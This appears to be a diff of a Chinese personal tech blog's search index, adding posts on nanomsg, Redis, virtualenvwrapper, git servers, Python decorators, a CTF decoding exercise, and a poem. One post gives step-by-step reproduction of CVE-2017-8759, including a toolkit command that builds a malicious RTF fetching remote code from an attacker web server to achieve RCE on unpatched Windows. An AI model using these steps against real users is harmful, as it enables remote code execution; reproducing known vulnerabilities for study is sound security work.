-<li><p><code>server_name blog.hustlibraco.com hustlibraco.com</code><br>接受这两个域名的请求</p>
-</li>
-<li><p><code>location ~ .\*\.(gif|jpg|png|css|js|ico|swf)(.\*){}</code><br>指定文件的缓存配置</p>
-</li>
-<li><p><code>location / {}</code><br>接受server_name下所有路径的请求</p>
-</li>
-<li><p><code>proxy_pass http://localhost:8000</code><br>转发到localhost的8000端口上</p>
-</li>
-<li><p><code>proxy_pass http://wx_server</code><br>转发到wx_server节点上，由upstream配置</p>
-</li>
-<li><p><code>proxy_redirect off</code><br>不重写被代理服务器返回给客户端的Location和Refresh</p>
-</li>
-<li><p><code>proxy_set_header Host $host</code><br>设置请求头的Host为反向代理服务器的Host</p>
-</li>
-<li><p><code>proxy_set_header X-Real-IP $remote_addr</code><br>设置请求头的X-Real-IP为客户端真实IP</p>
-</li>
-<li><p><code>proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for</code><br>把请求来源的IP添加到请求头的X-Forwarded-For字段</p>
-<blockquote>
-<p>X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP代理或者负载均衡服务器时才会添加该项。 它不是RFC中定义的标准请求头信息，在squid缓存代理服务器开发文档中可以找到该项的详细介绍。 标准格式如下：X-Forwarded-For: client1, proxy1, proxy2。</p>
-</blockquote>
-</li>
-<li><p><code>access_log /var/log/nginx/blog_hustlibraco_com_access.log</code><br>请求日志文件</p>
-</li>
-</ul>
-<p>了解这些配置项的意义之后，可以知道发送给blog.hustlibraco.com, hustlibraco.com的请求都会被转发到本地8000服务上，而发送给wx.hustlibraco.com的请求被转发到wx_server节点上（localhost:8001）。</p>
-<p>配置好以后使用命令service nginx reload使配置生效。</p>
-<h2 id="设置开机自启动"><a href="#设置开机自启动" class="headerlink" title="设置开机自启动"></a>设置开机自启动</h2><p>CentOS7引入了systemctl命令，结合了service和chkconfig的功能，一行命令设设置开机自启动:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> nginx.service</span><br><span class="line">ln <span class="_">-s</span> <span class="string">'/usr/lib/systemd/system/nginx.service'</span> <span class="string">'/etc/systemd/system/multi-user.target.wants/nginx.service'</span></span><br></pre></td></tr></table></figure>
-]]></content>
-    </entry>
-    
-  
-  
+  <entry>
+    <title><![CDATA[CVE-2017-8759复现]]></title>
+    <url>%2F2017%2F09%2F23%2FCVE-2017-8759-fuxian%2F</url>
+    <content type="text"><![CDATA[近日，360集团核心安全事业部分析团队发现一个新型的Office文档高级威胁攻击，攻击使用了9月12日补丁刚修复的.NET Framework漏洞，该漏洞在野外被利用时为0day状态，用户打开恶意的Office文档就会中招。该漏洞的技术原理和今年黑客“奥斯卡”Pwnie Awards上的最佳客户端漏洞（CVE-2017-0199）如出一辙，不同的是，这次黑客在Offcie文档中嵌入新的Moniker对象，利用的是.net库漏洞，在Office文档中加载执行远程的恶意.NET代码，而整个漏洞的罪魁祸首竞是.NET Framework一个换行符处理失误。 下载代码A: https://github.com/Voulnet/CVE-2017-8759-Exploit-sample B: https://github.com/bhdresh/CVE-2017-8759 部署文件把A中的exploit.txt、cmd.hta上传到一个web服务器，确保能够通过http访问。 修改文件内容修改exploit.txt中的地址为你的web访问地址 修改cmd.hta内容如下（看样子是VB脚本，理论上你可以写任意代码，原来的代码功能是打开画图程序） 生成RTF在B目录下执行： # you.com 是你的web访问地址python cve-2017-8759_toolkit.py -M gen -w readme.rtf -u http://your.com/exploit.txt 验证漏洞理论上在任何未打补丁的windows系统上，只要用户执行了readme.rtf，就被RCE了。 其他 原理：http://www.freebuf.com/articles/system/147602.html 解决cmd弹框闪烁问题：http://www.freebuf.com/vuls/147793.html]]></content>
+      <categories>
+        <category>安全</category>
+        <category>POC</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>Office RCE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[CentOS下安装nanomsg和nnpy]]></title>
+    <url>%2F2017%2F09%2F09%2Flinux-python-nanomsg%2F</url>
+    <content type="text"><![CDATA[nanomsg是ZeroMQ作者用C语言重写的一个Socket库，其用法和模式和ZeroMQ差不多，但是具有更好的性能和更完善的接口。 下面我们介绍一下CentOS7下nanomsg的安装，以及Python如何调用。 下载源码wget https://github.com/nanomsg/nanomsg/archive/1.0.0.tar.gz -O nanomsg-1.0.0.tar.gz 准备编译环境yum install gcc gcc-c++ python-devel cmake nanomsg要求cmake版本要CMake2.8.7以上，如果yum源版本不够，需要手动安装 编译安装nanomsgtar -zxvf nanomsg-1.0.0.tar.gzcd nanomsg-1.0.0mkdir bulid# 这一步如果出现问题，需要删除CMakeCache.txt重新cmakecmake ..cmake --build .# 执行测试ctest -C Debug .# 安装cmake --build . --target install# 把libnanomsg.so所在路径写入共享库目录（以/usr/local/lib64为例）echo "/usr/local/lib64" &gt;&gt; /etc/ld.so.conf# 加载共享库ldconfig 安装Python调用模块这里有两个选择:nanomsg-python 和 nnpy。其中nanomsg-python很久没人维护，而nnpy较新且已经合并到nanomsg的官方代码库中，推荐使用nnpy。nnpy是基于cffi的，所以需要安装cffi相关开发库，然后pip安装即可： yum install libffi-develpip install nnpy nnpy代码示例： import nnpypub = nnpy.Socket(nnpy.AF_SP, nnpy.PUB)pub.bind('inproc://foo')sub = nnpy.Socket(nnpy.AF_SP, nnpy.SUB)sub.connect('inproc://foo')sub.setsockopt(nnpy.SUB, nnpy.SUB_SUBSCRIBE, '')pub.send('hello, world')print(sub.recv()) 如果运行没有报错，那么就大功告成了。 备注 nnpy要求python版本2.7+/3.4+, 而nanomsg-python支持CPython 2.6+, 3.2+ and Pypy 2.1.0+。 如果一定要使用nanomsg-python，使用pip安装可能会收到告警：&quot;Could not load the default wrapper for your platform: XX, performance may be affected!&quot;。把源码拷贝下来使用python setup.py install安装可以解决这个问题。]]></content>
+      <categories>
+        <category>开发</category>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>Python</tag>
+        <tag>Nanomsg</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[虞美人· 听雨]]></title>
+    <url>%2F2017%2F07%2F21%2Fyumeiren%2F</url>
+    <content type="text"><![CDATA[宋·蒋捷 少年听雨歌楼上，红烛昏罗帐。壮年听雨客舟中，江阔云低，断雁叫西风。而今听雨僧庐下，鬓已星星也。悲欢离合总无凭，一任阶前点滴到天明。]]></content>
+      <categories>
+        <category>诗</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[TK对安全从业者的成长建议]]></title>
+    <url>%2F2017%2F06%2F30%2Fsecurity-personal-development%2F</url>
+    <content type="text"><![CDATA[今天看到一条TK的微博，分享了腾讯玄武实验室内部例会的一则PPT，讲的是个人成长。觉得讲得很好，在这里总结一下。 个人成长确立个人方向，结合工作内容，找出对应短板 该领域主要专家们的工作是否都了解？ 相关网络协议、文件格式是否都熟悉？ 相关的技术和主要工具是否看过、用过？ 阅读只是学习过程的起点，不能止于阅读 工具的每个参数每个菜单都要看、要试 学习网络协议要实际抓包分析、学习文件格式要读代码实现 学习老漏洞一定要调试，搞懂别人代码每一个字节的意义，之后一定要完全自己重写一个Exploit 细节、细节、细节，刨根问底 建立学习参考目标短期参考：比自己优秀的同龄人 阅读他们的文章和其他工作成果，从细节中观察他们的学习方式和工作方式 中期参考：相同方向上的业内专家 了解他们的成长轨迹，跟踪他们关注的内容 长期参考：业内老牌企业和先锋企业 把握行业发展、技术趋势，为未来做积累 推荐的学习方式以工具为线索 Kali Linux 以Metasploit为例： 遍历每个子目录，除了Exploit里面还有什么？ 每个工具分别有什么功能？原理是什么？涉及哪些知识？ 能否改进优化？能否发展、组合出新的功能？ 以专家为线索 你的技术方向里有哪些专家？ 他们的邮箱、主页、社交网络账号是什么？ 他们在该方向上有哪些作品？发表过哪些演讲？ 处理好学习、工作和生活学习、工作和生活是矛盾统一的 三者都需要时间，你一天只有24个小时 调和矛盾的关键：提高效率 对于一个没有好爸爸的人来说，学习、工作决定你能不能追求远方 如何提高效率做好预研，收集相关前人成果，避免无谓的重复劳动 在可行性判断阶段，能找到工具就不写代码，能用脚本语言写就不用编译语言，把完美主义放在最终实现阶段 做好笔记并定期整理，遗忘会让所有的投入都白白浪费 多和同事交流，别人说一个工具的名字可能让你节约数小时 咖啡可以提高思维效率，而且合法（？） 无论怎么提高效率，要成为专家，都需要大量的时间投入]]></content>
+      <categories>
+        <category>生活感悟</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[安全快速地导出Redis集合大数据]]></title>
+    <url>%2F2017%2F04%2F05%2Fdump-huge-redis-data%2F</url>
+    <content type="text"><![CDATA[最近利用redis的集合做数据去重，共存储3e条记录到一个键。现在需要把这3e数据导出到文本文件里面来。首先我们不能用smembers方法，这个方法会阻塞Redis进程，由于数据量太多，可能会阻塞几十秒，排除这个方法。 然后我们想到mysql导出大数据的时候会利用cursor来迭代处理，查阅redis文档，我们发现有类似的方法sscan, 可以一次取出指定数量的数据，并且迭代集合。这样不会阻塞redis服务，而且速度很快（40min处理了3e条数据）。 SCAN cursor [MATCH pattern] [COUNT count] Available since 2.8.0.Time complexity: O(1) for every call. O(N) for a complete iteration, including enough command calls for the cursor to return back to 0. N is the number of elements inside the collection. 代码片段如下： def main(): with open(to, 'wb') as f: cursor = '0' while cursor != 0: cursor, data = r.sscan(key, cursor=cursor, count=count) data = ['&#123;0&#125;\n'.format(i) for i in data] # 批量写入减少IO操作 f.writelines(data) print('cursor:&#123;0&#125;'.format(cursor)) 迭代开始的时候我们用0初始化cursor的值，每次迭代的时候都传入上一轮返回cursor值，直到cursor再次等于0的时候遍历结束。 sscan方法有几个特别的地方： 返回的cursor值并不是递增的，而且随机变化的，也就是说你不能通过cursor判断当前集合遍历的进度。 某些元素可能会被返回多次。 A given element may be returned multiple times. It is up to the application to handle the case of duplicated elements, for example only using the returned elements in order to perform operations that are safe when re-applied multiple times. 当集合在迭代的时候发生变化，某些元素可能不会被返回。 Elements that were not constantly present in the collection during a full iteration, may be returned or not: it is undefined. 迭代返回元素的数量可能和count指定的不一致 While SCAN does not provide guarantees about the number of elements returned at every iteration, it is possible to empirically adjust the behavior of SCAN using the COUNT option. Basically with COUNT the user specified the amount of work that should be done at every call in order to retrieve elements from the collection. This is just an hint for the implementation, however generally speaking this is what you could expect most of the times from the implementation. The default COUNT value is 10. When iterating the key space, or a Set, Hash or Sorted Set that is big enough to be represented by a hash table, assuming no MATCH option is used, the server will usually return count or a bit more than count elements per call. When iterating Sets encoded as intsets (small sets composed of just integers), or Hashes and Sorted Sets encoded as ziplists (small hashes and sets composed of small individual values), usually all the elements are returned in the first SCAN call regardless of the COUNT value. Important: there is no need to use the same COUNT value for every iteration. The caller is free to change the count from one iteration to the other as required, as long as the cursor passed in the next call is the one obtained in the previous call to the command. 因此不建议在集合可能会发生变动的情况下使用这个方法。 参考链接： redis官方文档 如何优雅地删除Redis大键]]></content>
+      <categories>
+        <category>开发</category>
+        <category>Redis</category>
+      </categories>
+      <tags>
+        <tag>Redis</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[使用virtualenvwrapper(Linux + Windows)]]></title>
+    <url>%2F2017%2F01%2F10%2Fuse-virtualenvwrapper%2F</url>
+    <content type="text"><![CDATA[生活的问题在于，你永远不知道下一个到来的是什么问题。开发亦然。之前Python都是用一个运行环境，偶尔用一下virtualenv，直到开始在windows调试python才不得不来学习virtualenvwrapper。 简介Virtualenvwrapper解决的主要问题是和virtualenv一样的，但是它弥补了virtualenv无法统一管理环境的缺点。 安装virtualenvwrapper安装方式还是比较简单的。 Linux1.安装pip install virtualenvwrapper 2.设置环境变量export WORKON_HOME=~/Envsexport PROJECT_HOME=$HOME/pyprojsource /usr/bin/virtualenvwrapper.sh 建议添加到自启动脚本中~/.bashrc 或 ~/.profile。 Windowswindows下直接安装virtualenvwrapper似乎不能运行。我搜索到有独立的安装包，也能通过pip安装。https://github.com/davidmarble/virtualenvwrapper-win。 1.安装# using pippip install virtualenvwrapper-win# using easy_installeasy_install virtualenvwrapper-win# from sourcegit clone git://github.com/davidmarble/virtualenvwrapper-win.gitcd virtualenvwrapper-winpython setup.py install 2.设置环境变量（可选）Optional: Add an environment variable WORKON_HOME to specify the path to store environments. By default, this is `%USERPROFILE%\Envs`。 3.可能出现的错误 File &quot;D:\Python\Python27\Lib\mimetypes.py&quot;, line 249, in enum_types ctype = ctype.encode(default_encoding) # omit in 3.x!UnicodeDecodeError: &apos;ascii&apos; codec can&apos;t decode byte 0xb0 in position 1: ordinal not in range(128) 原因是某些程序（阿里旺旺）写了一些中文键值到注册表里。具体看http://pcliuyang.blog.51cto.com/8343567/1339637 解决方法：打开Python27/Lib/mimetypes.py，找到default_encoding = sys.getdefaultencoding()一行，在它前面添加如下代码：# begin fix bugif sys.getdefaultencoding() != &apos;gbk&apos;: reload(sys) sys.setdefaultencoding(&apos;gbk&apos;)# end 命令主要命令Linux和windows是一致的，部分有出入。 主要命令mkvirtualenv &lt;name&gt; Create a new virtualenv environment named . The environment will be created in WORKON_HOME. lsvirtualenv List all of the enviornments stored in WORKON_HOME. rmvirtualenv &lt;name&gt; Remove the environment . Uses folder_delete.bat. workon [&lt;name&gt;] If is specified, activate the environment named (change the working virtualenv to ). If a project directory has been defined, we will change into it. If no argument is specified, list the available environments. One can pass additional option -c after virtualenv name to cd to virtualenv directory if no projectdir is set. deactivate Deactivate the working virtualenv and switch back to the default system Python. add2virtualenv &lt;full or relative path&gt; If a virtualenv environment is active, appends to virtualenv_path_extensions.pth inside the environment’s site-packages, which effectively adds to the environment’s PYTHONPATH. If a virtualenv environment is not active, appends to virtualenv_path_extensions.pth inside the default Python’s site-packages. If doesn’t exist, it will be created. 其他命令cdproject If a virtualenv environment is active and a projectdir has been defined, change the current working directory to active virtualenv’s project directory. cd- will return you to the last directory you were in before calling cdproject. cdsitepackages If a virtualenv environment is active, change the current working directory to the active virtualenv’s site-packages directory. If a virtualenv environment is not active, change the current working directory to the default Python’s site-packages directory. cd- will return you to the last directory you were in before calling cdsitepackages. cdvirtualenv If a virtualenv environment is active, change the current working directory to the active virtualenv base directory. If a virtualenv environment is not active, change the current working directory to the base directory of the default Python. cd- will return you to the last directory you were in before calling cdvirtualenv. lssitepackages If a virtualenv environment is active, list that environment’s site-packages. If a virtualenv environment is not active, list the default Python’s site-packages. Output includes a basic listing of the site-packages directory, the contents of easy-install.pth, and the contents of virtualenv_path_extensions.pth (used by add2virtualenv). setprojectdir(win)/setvirtualenvproject(Linux) 这两个命令功能相同，但是格式不同。setprojectdir只需要一个参数，指定工程主目录。setvirtualenvproject需要两个参数，参数一指定虚拟环境目录，参数二指定工程主目录。参数可省略，省略时使用当前的虚拟环境和当前目录。 # setvirtualenvproject 用法示例$ mkproject myprojNew python executable in myproj/bin/pythonInstalling setuptools.................................................................................................................................................................................done.Creating /Users/dhellmann/Devel/myproj(myproj)$ mkvirtualenv myproj_new_libsNew python executable in myproj/bin/pythonInstalling setuptools.................................................................................................................................................................................done.Creating /Users/dhellmann/Devel/myproj(myproj_new_libs)$ setvirtualenvproject $VIRTUAL_ENV $(pwd) toggleglobalsitepackages If a virtualenv environment is active, toggle between having the global site-packages in the PYTHONPATH or just the virtualenv’s site-packages. whereis &lt;file&gt; A script included for convenience. Returns directory locations of file and file with any executable extensions. So you can call whereis python to find all executables starting with python or whereis python.exe for an exact match. mkproject(Only in Linux) 项目将创建到PROJECT_HOME目录下，实际上相当于在某个目录下，建了一个环境。]]></content>
+      <categories>
+        <category>开发</category>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[搭建使用个人Git服务器]]></title>
+    <url>%2F2016%2F12%2F16%2Fprivate-git%2F</url>
+    <content type="text"><![CDATA[一直一来都不用IDE，直接用SFTPDriver把Linux服务器文件直接映射到Windows本次操作。可惜Win10已经用不了SftpDriver，替代品稳定性捉急，因此在Linux上搭建个人Git服务器成为了必然。 Git服务器搭建以CentOS7为例，有以下几个步骤。 安装gitsudo yum install git 创建git用户，创建authorized_keys文件一定要设置好权限，否则无法起作用或者不安全adduser git su - gitmkdir .ssh &amp;&amp; chmod 700 .sshtouch .ssh/authorized_keyschmod 600 .ssh/authorized_keys 创建一个空仓库cd /home/gitgit init --bare sample.git 禁止git用户登录服务器# 修改 /bin/bash 为 git-shellvim /etc/passwdgit:x:1001:1002::/home/git:/usr/bin/git-shell 退出git用户TortoiseGit客户端使用使用Puttygen生成密钥对公钥复制粘贴到服务器的/home/git/.ssh/authorized_keys文件中。私钥保存在本地。 TortoiseGit默认不是OpenSSH 克隆仓库右键 git clone，加载Putty密钥选择刚刚生成的私钥。 错误帮助如果提示网络无法链接，那么服务器的ssh端口很可能不是22！如果服务器ssh端口不是22，则要求如下格式： ssh://git@115.28.137.182:23456/home/git/sample.git ssh:// 前缀必不可少 ip和端口之间一个冒号，端口和项目地址没有冒号！ 如果要求你输入git的密码，那么很有可能authorized_keys有问题 格式错误 权限不对 具体可以在 systemctl status sshd 里看到错误日志！]]></content>
+      <categories>
+        <category>开发</category>
+        <category>Git</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>Git</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[【转】Python装饰器]]></title>
+    <url>%2F2016%2F12%2F05%2Fpython-decorator%2F</url>
+    <content type="text"><![CDATA[装饰器本质上是一个Python函数，它可以让其他函数在不需要做任何代码变动的前提下增加额外功能，装饰器的返回值也是一个函数对象。它经常用于有切面需求的场景，比如：插入日志、性能测试、事务处理、缓存、权限校验等场景。装饰器是解决这类问题的绝佳设计，有了装饰器，我们就可以抽离出大量与函数功能本身无关的雷同代码并继续重用。概括的讲，装饰器的作用就是为已经存在的对象添加额外的功能。 先来看一个简单例子： def foo(): print('i am foo')现在有一个新的需求，希望可以记录下函数的执行日志，于是在代码中添加日志代码：def foo(): print('i am foo') logging.info("foo is running") bar()、bar2()也有类似的需求，怎么做？再写一个logging在bar函数里？这样就造成大量雷同的代码，为了减少重复写代码，我们可以这样做，重新定义一个函数：专门处理日志 ，日志处理完之后再执行真正的业务代码 def use_logging(func): logging.warn("%s is running" % func.__name__) func()def bar(): print('i am bar')use_logging(bar) 逻辑上不难理解， 但是这样的话，我们每次都要将一个函数作为参数传递给use_logging函数。而且这种方式已经破坏了原有的代码逻辑结构，之前执行业务逻辑时，执行运行bar()，但是现在不得不改成use_logging(bar)。那么有没有更好的方式的呢？当然有，答案就是装饰器。 简单装饰器def use_logging(func): def wrapper(*args, **kwargs): logging.warn("%s is running" % func.__name__) return func(*args, **kwargs) return wrapperdef bar(): print('i am bar')bar = use_logging(bar)bar() 函数use_logging就是装饰器，它把执行真正业务方法的func包裹在函数里面，看起来像bar被use_logging装饰了。在这个例子中，函数进入和退出时，被称为一个横切面(Aspect)，这种编程方式被称为面向切面的编程(Aspect-Oriented Programming)。@符号是装饰器的语法糖，在定义函数的时候使用，避免再一次赋值操作。 def use_logging(func): def wrapper(*args, **kwargs): logging.warn("%s is running" % func.__name__) return func(*args) return wrapper@use_loggingdef foo(): print("i am foo")@use_loggingdef bar(): print("i am bar")bar() 如上所示，这样我们就可以省去bar = use_logging(bar)这一句了，直接调用bar()即可得到想要的结果。如果我们有其他的类似函数，我们可以继续调用装饰器来修饰函数，而不用重复修改函数或者增加新的封装。这样，我们就提高了程序的可重复利用性，并增加了程序的可读性。 装饰器在Python使用如此方便都要归因于Python的函数能像普通的对象一样能作为参数传递给其他函数，可以被赋值给其他变量，可以作为返回值，可以被定义在另外一个函数内。 带参数的装饰器装饰器还有更大的灵活性，例如带参数的装饰器：在上面的装饰器调用中，比如@use_logging，该装饰器唯一的参数就是执行业务的函数。装饰器的语法允许我们在调用时，提供其它参数，比如@decorator(a)。这样，就为装饰器的编写和使用提供了更大的灵活性。 def use_logging(level): def decorator(func): def wrapper(*args, **kwargs): if level == "warn": logging.warn("%s is running" % func.__name__) return func(*args) return wrapper return decorator@use_logging(level="warn")def foo(name='foo'): print("i am %s" % name)foo() 上面的use_logging是允许带参数的装饰器。它实际上是对原有装饰器的一个函数封装，并返回一个装饰器。我们可以将它理解为一个含有参数的闭包。当我 们使用@use_logging(level=”warn”)调用的时候，Python能够发现这一层的封装，并把参数传递到装饰器的环境中。 类装饰器再来看看类装饰器，相比函数装饰器，类装饰器具有灵活度大、高内聚、封装性等优点。使用类装饰器还可以依靠类内部的__call__方法，当使用 @ 形式将装饰器附加到函数上时，就会调用此方法。class Foo(object): def __init__(self, func): self._func = funcdef __call__(self): print ('class decorator runing') self._func() print ('class decorator ending')@Foodef bar(): print ('bar')bar() functools.wraps使用装饰器极大地复用了代码，但是他有一个缺点就是原函数的元信息不见了，比如函数的docstring、__name__、参数列表，先看例子：装饰器def logged(func): def with_logging(*args, **kwargs): print func.__name__ + " was called" return func(*args, **kwargs) return with_logging 函数@loggeddef f(x): """does some math""" return x + x * x 该函数完成等价于：def f(x): """does some math""" return x + x * xf = logged(f) 不难发现，函数f被with_logging取代了，当然它的docstring，__name__就是变成了with_logging函数的信息了。print f.__name__ # prints 'with_logging'print f.__doc__ # prints None 这个问题就比较严重的，好在我们有functools.wraps，wraps本身也是一个装饰器，它能把原函数的元信息拷贝到装饰器函数中，这使得装饰器函数也有和原函数一样的元信息了。 from functools import wrapsdef logged(func): @wraps(func) def with_logging(*args, **kwargs): print func.__name__ + " was called" return func(*args, **kwargs) return with_logging@loggeddef f(x): """does some math""" return x + x * xprint f.__name__ # prints 'f'print f.__doc__ # prints 'does some math' 内置装饰器@staticmathod、@classmethod、@property 装饰器的顺序@a@b@cdef f (): pass 等效于f = a(b(c(f))) 作者：zhijun liu链接：https://www.zhihu.com/question/26930016/answer/99243411来源：知乎著作权归作者所有，转载请联系作者获得授权。 个人练习#coding=utf-8#!/usr/bin/env pythonfrom functools import wrapsfrom hashlib import md5from random import randintimport osimport redisimport time, datetimeclass Decorator(object): """装饰器类""" func_cache_dict = &#123;&#125; func_cache_key = 'func_cache' rds = redis.StrictRedis() @classmethod def func_cache(cls, func): @wraps(func) def wrapper(*args, **kargs): argstr = '&#123;0&#125;+&#123;1&#125;+&#123;2&#125;'.format(func.__name__, '+'.join(str(i) for i in args), '+'.join('&#123;0&#125;=&#123;1&#125;'.format(k,v) for k,v in kargs.iteritems())) uniqid = md5(argstr).hexdigest() if uniqid not in cls.func_cache_dict: try: res = func(*args, **kargs) except Exception as e: logging.error(e, exc_info=True) return None else: cls.func_cache_dict[uniqid] = res return cls.func_cache_dict[uniqid] return wrapper @classmethod def fun_cache_expire(cls, expire_time): assert isinstance(expire_time, int), 'expire_time must be a integer.' def decorator(func): @wraps(func) def wrapper(*args, **kargs): argstr = '&#123;0&#125;+&#123;1&#125;+&#123;2&#125;'.format(func.__name__, '+'.join(str(i) for i in args), '+'.join('&#123;0&#125;=&#123;1&#125;'.format(k,v) for k,v in kargs.iteritems())) uniqid = md5(argstr).hexdigest() expire_at = float(cls.rds.get(cls.func_cache_key + uniqid) or 0) cond1 = (uniqid not in cls.func_cache_dict) cond2 = (time.time() &gt; expire_at) # print 'cond1:&#123;0&#125;, cond2:&#123;1&#125;'.format(cond1, cond2) if cond1 or cond2: try: res = func(*args, **kargs) except Exception as e: logging.error(e, exc_info=True) return None else: cls.func_cache_dict[uniqid] = res cls.rds.setex(cls.func_cache_key + uniqid, datetime.timedelta(seconds=expire_time), time.time() + expire_time) return cls.func_cache_dict[uniqid] return wrapper return decoratordef randomstr1(): return os.urandom(8).encode('hex')@Decorator.func_cachedef randomstr2(): return os.urandom(8).encode('hex')@Decorator.fun_cache_expire(3)# 结果缓存三秒def randomstr3(): return os.urandom(8).encode('hex')@Decorator.fun_cache_expire(1)# 带参数的函数def randomstr4(*args): s = '_'.join(str(i) for i in args) return md5(s).hexdigest()for i in range(8): args = [randint(1,100) for i in range(3)] print randomstr1(), randomstr2(), randomstr3(), randomstr4(*args) time.sleep(1)print randomstr1(), randomstr2(), randomstr3(), randomstr4(*args) 运行结果：302e93d809adda2f 828719ab1a357f0a 9e9a3d8e26d8b101 71078cd8bf589b0a82a4d64867a4fca98ff79b5be99afab7 828719ab1a357f0a 9e9a3d8e26d8b101 2642897d9d2e5d403790f5efcb51c9de284014dc432de190 828719ab1a357f0a 9e9a3d8e26d8b101 79c3b2f9cee061069dc95f27ec93893b# randomstr3 函数结果缓存3秒，所以3秒变换一次结果8d6201c551e12e08 828719ab1a357f0a bae42a9245254d39 840d506ee9004882b3b8537c722cc9178038c2c75f0e2584 828719ab1a357f0a bae42a9245254d39 454715c6f86330eebf9a79d65c4c519d1ad603c8b1c0f862 828719ab1a357f0a bae42a9245254d39 0c69a374754d0c546fe588ff638c4376f3a35c418c35084c 828719ab1a357f0a 6997bc4c1a5c6acf 71a735b4c528d6eb7bc49375f2e031a7d42fcb94450a61aa 828719ab1a357f0a 6997bc4c1a5c6acf 4d309f93de6bcb766ca623d9270cf422# randomstr4 函数最后一次执行的入参与上次相同，所以结果与上一次相同90e416f4a6177b8d 828719ab1a357f0a 6997bc4c1a5c6acf 4d309f93de6bcb766ca623d9270cf422]]></content>
+      <categories>
+        <category>开发</category>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[pip设置国内源]]></title>
+    <url>%2F2016%2F11%2F28%2Fpypi-source-setting%2F</url>
+    <content type="text"><![CDATA[每次学习编程的时候都会遇到许多运维的问题。身为立志成为一名全站工程师的我，只有不断折腾了。 pip的默认下载源是国外的，所以不是很快，类似yum我们想替换成国内的源，比如： 阿里云 http://mirrors.aliyun.com/pypi/simple/ 豆瓣 https://pypi.doubanio.com/simple/ 网上搜到的地址很多都是过期的，验证方法是用浏览器打开的能看到包列表的地址。比如https://pypi.douban.com/simple/用浏览器打开会跳转至https://pypi.doubanio.com/simple/，这才是最终的正确地址。 以豆瓣源为例，在Linux下面，创建/etc/pip.conf，编辑内容如下: [global]timeout = 60trusted-host=pypi.doubanio.comindex-url=https://pypi.doubanio.com/simple/ 保存即可生效，甚至包括virtualenv创建出来的pip也会用这个源。 临时用法pip install xxx -i http://mirrors.aliyun.com/pypi/simple/ 更多设置可以针对不同Linux用户设置不同源，详见 https://pip.pypa.io/en/stable/user_guide/#configuration]]></content>
+      <categories>
+        <category>开发</category>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[根据php加密算法编写python解密代码]]></title>
+    <url>%2F2016%2F10%2F09%2Fphp2python-code%2F</url>
+    <content type="text"><![CDATA[服务器搬家，暂时无法工作，拿起一道CTF练练手。 php代码是一张图片: 使用了rot13、逆序、base64等方法加密，我们将其翻译成python代码： def rot13(s, offset=13): ''' ROT-13 编码是一种每一个字母被另一个字母代替的方法。 这个代替字母是由原来的字母向前移动 13 个字母而得到的。数字和非字母字符保持不变。 ''' def encodeCh(ch): f=lambda x: chr((ord(ch)-x+offset) % 26 + x) return f(97) if ch.islower() else (f(65) if ch.isupper() else ch) return ''.join(encodeCh(c) for c in s)def encode(s): oo = '' o = s[::-1] for i in range(0, len(o)): c = chr(ord(o[i])+1) oo += c return rot13(base64.b64encode(oo)[::-1]) 照着encode函数，很容易可以写出来decode函数: def decode(s): o = '' oo = base64.b64decode(rot13(s)[::-1]) for i in range(0, len(oo)): c = chr(ord(oo[i])-1) o += c return o[::-1] 密文s=a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws, 我们调用一下decode函数，直接得到结果。 root@kaliSec:~/文档# python 1.py a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws flag:&#123;NSCTF_b73d5adfb819c64603d7237fa0d52977&#125; 语言都是相通的，熟悉算法和数据结构更为关键。]]></content>
+      <categories>
+        <category>开发</category>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+        <tag>Php</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Kali Linux 2016.1 安装 Chrome]]></title>
+    <url>%2F2016%2F09%2F18%2Fkali-linux-install-chrome%2F</url>
+    <content type="text"><![CDATA[Kali Linux 2016.1 Rolling Edtion 预装的是iceweasel浏览器，如果要使用chrome需要自己下载安装包并需要额外的设置。 1. 下载地址wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb实测不用翻墙，速度还挺快。 2. 安装命令dpkg -i google-chrome-stable_current_amd64.deb 如果缺少依赖： apt-get install -f 3. 运行设置安装完chrome之后我们发现并不能正常打开它，需要在/usr/share/application里找到chrome的快捷方式，在原先的运行命令添加--no-sandbox和--user-dir-data。 --no-sandbox 解决点击图片无响应问题 --user-dir-data 解决Chrome不能在root用户下运行的问题]]></content>
+      <categories>
+        <category>安全</category>
+        <category>Kali</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>Kali</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[使用Gunicorn部署Flask Web服务]]></title>
+    <url>%2F2016%2F08%2F31%2Fgunicorn-with-flask%2F</url>
